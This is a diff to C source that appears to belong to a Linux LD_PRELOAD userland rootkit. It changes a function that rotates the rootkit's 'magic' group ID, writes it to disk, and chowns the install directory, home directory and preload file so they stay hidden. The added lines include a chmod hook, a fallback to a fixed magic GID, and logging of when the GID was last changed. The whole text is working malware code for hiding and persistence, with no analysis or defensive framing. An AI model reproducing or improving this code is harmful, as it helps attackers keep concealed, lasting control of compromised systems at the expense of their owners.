@@ -14,10 +14,11 @@ void hidedircontents(const char *path, gid_t newgid){
         chown_path(tmp, newgid);
     }
     closedir(dp);
+    chown_path(path, newgid);
 }
 
 gid_t changerkgid(void){
-    hook(CFOPEN, CSETGID, CFWRITE);
+    hook(CFOPEN, CSETGID, CFWRITE, CCHMOD);
     srand(time(NULL));
 
     FILE *fp;
@@ -25,22 +26,24 @@ gid_t changerkgid(void){
     int x = 3, i;
     char buf[12];
 
-    fp = call(CFOPEN, GID_PATH, "w");
-    if(fp == NULL)
-        return -1;
-
     oldgid = getgid();
     newgid = rand() >> x;
     while((long)call(CSETGID, newgid) < 0)
         newgid = rand() >> x++;
     call(CSETGID, oldgid);
 
+    fp = call(CFOPEN, GID_PATH, "w");
+    if(fp == NULL)
+        return MAGIC_GID;
     snprintf(buf, sizeof(buf), "%d", newgid);
     call(CFWRITE, buf, 1, strlen(buf), fp);
     fclose(fp);
 
-    // these are 3 paths that will always exist regardless.
+#ifdef PATCH_DYNAMIC_LINKER
     char *bdvpaths[3] = {INSTALL_DIR, HOMEDIR, PRELOAD_FILE};
+#else
+    char *bdvpaths[3] = {INSTALL_DIR, HOMEDIR, OLD_PRELOAD};
+#endif
     for(i = 0; i != sizeofarr(bdvpaths); i++)
         chown_path(bdvpaths[i], newgid);
 
@@ -53,9 +56,11 @@ gid_t changerkgid(void){
 
     hidedircontents(INSTALL_DIR, newgid);
     hidedircontents(HOMEDIR, newgid);
+
 #ifdef HIDE_MY_ASS
     hidemyass();
 #endif
 
+    writenewtime(GIDTIME_PATH, time(NULL));
     return newgid;
 }
